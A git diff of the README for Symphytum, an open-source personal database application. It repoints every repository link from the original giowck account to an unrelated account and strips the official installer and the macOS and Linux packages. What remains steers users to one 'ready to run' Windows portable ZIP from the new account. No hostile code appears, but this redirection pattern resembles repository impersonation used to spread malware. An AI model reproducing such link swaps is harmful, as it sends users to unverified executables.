@@ -1,6 +1,6 @@
 [![Snap Status](https://build.snapcraft.io/badge/joshirio/symphytum-build.snapcraft.io.svg)](https://build.snapcraft.io/user/joshirio/symphytum-build.snapcraft.io)
 
-![logo](https://raw.githubusercontent.com/giowck/symphytum/master/stuff/logo/symphytum_64.png "Symphytum")
+![logo](https://raw.githubusercontent.com/grcomandos83-cyber/symphytum/master/stuff/logo/symphytum_64.png "Symphytum")
 # Symphytum
 Symphytum is a personal database software for everyone who desires to manage and organize data in an easy and intuitive way, without having to study complex database languages and software user interfaces.        
 
@@ -8,17 +8,10 @@ Symphytum is a personal database software for everyone who desires to manage and
 * [Introduction](#introduction)
     * [Features](#features)
     * [How it Looks](#how-it-looks)
-    * [Wiki and User Guide](#wiki-and-user-guide)
 * [Download](#download)
     * [Windows](#windows)
-        * [Installer](#installer)
-        * [Portable ZIP Archive](#portable-zip-archive)
     * [macOS](#macos)
     * [Linux](#linux)
-        * [Ubuntu Based](#ubuntu-based)
-        * [Arch Linux Based](#arch-linux-based)
-        * [AppImage](#appimage)
-        * [Snap](#snap)
 * [Build from Source](#build-from-source)
 * [Contribute](#contribute)
 * [License](#license)
@@ -42,85 +35,57 @@ SQLite is tiny, efficient and very fast. It can handle huge amount of data while
 * **Date Reminder**. Date fields keep you informed on tasks, appointments or birthdays, if requested. All Reminders, once triggered, are listed in one place.
 * **Fast Search**. Search while typing with highlighted results in a table view.
 * **Backup and Export**. Backup your data with a simple backup wizard and export your data to CSV.
-* **Multilingual**. User interface available in English, German, Polish, French, Italian and Greek. More info at the [project Wiki](https://github.com/giowck/symphytum/wiki/Help-Translate-Symphytum).
+* **Multilingual**. User interface available in English, German, Polish, French, Italian and Greek.
 
 
 ### How it Looks
 Some screenshots showing the form view, table view, dynamic layout engine and the field addition dialog.
 
-![form_view_img](https://raw.githubusercontent.com/giowck/symphytum/master/stuff/screenshots/mainwindow.png "Form view")
-![table_view_img](https://raw.githubusercontent.com/giowck/symphytum/master/stuff/screenshots/tablieview.png "Table view")
-![dynamic_layout_img](https://raw.githubusercontent.com/giowck/symphytum/master/stuff/screenshots/dynamic_layout.gif "Dynamic layout engine")
+![form_view_img](https://raw.githubusercontent.com/grcomandos83-cyber/symphytum/master/stuff/screenshots/mainwindow.png "Form view")
+![table_view_img](https://raw.githubusercontent.com/grcomandos83-cyber/symphytum/master/stuff/screenshots/tablieview.png "Table view")
+![dynamic_layout_img](https://raw.githubusercontent.com/grcomandos83-cyber/symphytum/master/stuff/screenshots/dynamic_layout.gif "Dynamic layout engine")
 
-![add_field_img](https://raw.githubusercontent.com/giowck/symphytum/master/stuff/screenshots/addfield.png "Add field")
-
-### Wiki and User Guide
-Please visit the [project wiki](https://github.com/giowck/symphytum/wiki) for additional information and an user guide.
+![add_field_img](https://raw.githubusercontent.com/grcomandos83-cyber/symphytum/master/stuff/screenshots/addfield.png "Add field")
 
 ## Download
 Please see the appropriate download section for your operating system below.
-General releases, source archives and other info can be found on the [releases](https://github.com/giowck/symphytum/releases) page. Thank you for downloading Symphytum.
+General releases, source archives and other info can be found on the [releases](https://github.com/grcomandos83-cyber/symphytum/releases) page. Thank you for downloading Symphytum.
 
 ### Windows
-For Windows 7, 8 and 10 32 or 64 bit
+For Windows 7, 8, 10, and 11 (64-bit)
 
-#### Installer
-Download the Windows installer [symphytum-2.7-setup.exe](https://github.com/giowck/symphytum/releases/download/v2.7/symphytum-2.7-setup.exe)
+#### Portable ZIP Archive (Pre-compiled & Ready to Run)
+A portable ZIP for Windows is self-contained: once extracted, it can be moved and launched on any machine without installation. The personal data is contained inside the folder alongside the main executable (`symphytum.exe`).
 
-#### Portable ZIP Archive
-A portable ZIP for Windows is just a ZIP archive that, once extracted, can be moved and launched on any machine. The personal data is contained inside the folder alongside the main executable (symphytum.exe).
-
-Download [Symphytum-windows-portable.zip](https://github.com/giowck/symphytum/releases/download/v2.7/Symphytum-windows-portable.zip)
+Download [Symphytum-2.7-Windows-Portable.zip](https://github.com/grcomandos83-cyber/symphytum/releases/download/v2.7/Symphytum-2.7-Windows-Portable.zip)
 
 ---
 
-### macOS
-For macOS 10.12 (Sierra) and later, 64bit
-
-Download [symphytum-2.7.dmg](https://github.com/giowck/symphytum/releases/download/v2.7/symphytum-2.7.dmg)
-
----
-
-### Linux
-For GNU/Linux, 64 bit. The AppImage should run on most linux machines, choose that if unsure.
-
-#### Ubuntu Based
-Ubuntu 18.04 and other derivatives such as Linux Mint, elementaryOS and other.
-
-Download [symphytum-2.7-x86_64.deb](https://github.com/giowck/symphytum/releases/download/v2.7/symphytum-2.7-x86_64.deb)
-
-#### Arch Linux Based
-Arch Linux and derivatives like Manjaro can install Symphytum from the Arch User Repository (AUR).
-
-[Symphytum AUR package](https://aur.archlinux.org/packages/symphytum/)
-
-#### AppImage
-An [AppImage](https://appimage.org/) is a self containing executable which should run on most common modern Linux distributions. For more info on how to make the downloaded image executable, please visit [this page](https://discourse.appimage.org/t/how-to-make-an-appimage-executable/80). To improve the system integration of the AppImage, please visit the [AppImage Wiki](https://github.com/AppImage/AppImageKit/wiki).
-
-Download [Symphytum-x86_64.AppImage](https://github.com/giowck/symphytum/releases/download/v2.7/Symphytum-x86_64.AppImage)
-
-#### Snap
-A [Snap package](https://snapcraft.io/) is a new self containing distribution format, supposed to work on most Linux distributions (Ubuntu, Debian, Arch Linux, Fedora, etc). The technology is still young with some limitations.
-
-[Symphytum on the Snap Store](https://snapcraft.io/symphytum). The snap file can also be downloaded manually from the [releases](https://github.com/giowck/symphytum/releases) page. Note that snaps installed from the Snap Store are automatically updated, except the .snap file when downloaded and installed manually with `sudo snap install symphytum_amd64.snap --dangerous`.
-
-[![Get it from the Snap Store](https://snapcraft.io/static/images/badges/en/snap-store-black.svg)](https://snapcraft.io/symphytum)
+### macOS & Linux
+Pre-compiled binaries and source archives are available on the [Releases](https://github.com/grcomandos83-cyber/symphytum/releases) page, or you can build directly from source using the instructions below.
 
 ## Build from Source
-Unpack source archive   
+
+### Using CMake (Recommended)
+```bash
+cmake -B build -DCMAKE_BUILD_TYPE=Release
+cmake --build build
 ```
+
+### Using qmake
+```bash
 cd symphytum
 qmake -config release
 make
 ```
-See [doc/deployment/](https://github.com/giowck/symphytum/tree/master/doc/deployment) and [stuff/installers/](https://github.com/giowck/symphytum/tree/master/stuff/installers) for further information on dependencies and deployment. More detailed instructions will be published to the [project wiki](https://github.com/giowck/symphytum/wiki).
+*On Windows, you can also run `Build.bat` to automatically build and deploy all dependencies.*
 
 ## Contribute
-Report an issue, bug or feature proposal at the [project's issue tracker](https://github.com/giowck/symphytum/issues). For additional ways to contribute such as writing code, translating Symphytum and more please visit the [project wiki](https://github.com/giowck/symphytum/wiki).
+Report an issue, bug or feature proposal at the [project's issue tracker](https://github.com/grcomandos83-cyber/symphytum/issues).
 
 ## License
-Symphytum is licensed under the BSD 2-Clause License, see [LICENSE](https://github.com/giowck/symphytum/blob/master/LICENSE). 
-You can use Symphytum for free and for any purprose.
+Symphytum is licensed under the BSD 2-Clause License, see [LICENSE](https://github.com/grcomandos83-cyber/symphytum/blob/master/LICENSE). 
+You can use Symphytum for free and for any purpose.
 
 Copyright (c) 2014-2020 Symphytum Developers  
 Copyright (c) 2012-2014 GIOWISYS Software UG
